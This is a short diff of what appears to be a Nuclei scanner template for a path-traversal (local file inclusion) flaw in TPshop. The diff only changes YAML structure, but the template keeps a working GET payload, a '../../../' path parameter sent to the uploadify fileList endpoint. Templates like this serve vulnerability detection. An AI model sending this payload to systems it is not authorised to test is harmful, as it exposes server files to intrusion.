@@ -12,10 +12,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: tpshop,lfi
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"
